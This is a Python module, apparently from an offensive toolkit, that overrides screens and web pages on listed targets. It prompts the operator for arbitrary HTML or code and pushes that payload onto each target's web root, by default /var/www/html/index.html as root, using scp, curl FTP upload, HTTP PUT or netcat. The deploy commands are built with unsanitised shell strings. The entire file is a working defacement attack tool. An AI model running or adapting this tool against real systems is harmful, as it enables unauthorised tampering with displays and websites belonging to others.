# modules/exploits/screen_override.py

import yaml
import os
import time
import subprocess
from utils.yaml_loader import load_yaml
from tools.readme_autoupdate import log_action

TARGETS_FILE = "config/targets.yaml"
PAYLOAD_OUT_DIR = "results/screen_override_payloads"

def list_screen_targets():
    targets = load_yaml(TARGETS_FILE)
    screen_targets = {
        name: props for name, props in targets.items()
        if 'screen' in props.get('tags', []) or 'display' in props.get('tags', [])
    }
    return screen_targets

def prompt_target_selection(screen_targets):
    print("\nAvailable Screen Targets:")
    for idx, (name, props) in enumerate(screen_targets.items()):
        print(f"[{idx}] {name} ({props.get('ip')} / {props.get('interface')})")

    choice = input("Select screen to override by number: ")
    try:
        index = int(choice)
        selected_name = list(screen_targets.keys())[index]
        return selected_name, screen_targets[selected_name]
    except (ValueError, IndexError):
        print("Invalid selection.")
        return None, None

def prompt_custom_message():
    print("\nEnter your custom HTML message or code to display:")
    return input("Payload> ")

def generate_payload_file(target_name, target_props, payload):
    os.makedirs(PAYLOAD_OUT_DIR, exist_ok=True)
    filename = f"{PAYLOAD_OUT_DIR}/{target_name.replace(' ', '_')}_payload.html"
    with open(filename, "w") as f:
        f.write(payload)
    return filename

def deploy_payload(target_props, payload_file):
    ip = target_props.get("ip")
    method = target_props.get("protocol", "http")
    username = target_props.get("username", "root")
    remote_path = target_props.get("path", "/var/www/html/index.html")

    print(f"\n[*] Deploying payload to {ip} via {method.upper()}...")

    if method == "scp":
        cmd = f"scp {payload_file} {username}@{ip}:{remote_path}"
    elif method == "ftp":
        cmd = f"curl -T {payload_file} ftp://{username}@{ip}/{os.path.basename(remote_path)}"
    elif method == "http":
        cmd = f"curl -X PUT --data-binary @{payload_file} http://{ip}/{os.path.basename(remote_path)}"
    elif method == "nc":
        cmd = f"cat {payload_file} | nc {ip} 1234"
    else:
        print(f"[!] Unknown protocol: {method}")
        return

    try:
        print(f"[>] Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True)
        print("[+] Payload deployed successfully.")
    except subprocess.CalledProcessError:
        print("[!] Failed to deploy payload.")

def run():
    print("\n[READY2GO: SCREEN OVERRIDE MODULE]")
    screen_targets = list_screen_targets()

    if not screen_targets:
        print("[-] No screen targets found in targets.yaml with tag 'screen' or 'display'.")
        return

    target_name, target_props = prompt_target_selection(screen_targets)
    if not target_name:
        return

    payload = prompt_custom_message()
    payload_file = generate_payload_file(target_name, target_props, payload)
    deploy_payload(target_props, payload_file)

    log_action(f"screen_override -> {target_name}")

if __name__ == "__main__":
    run()
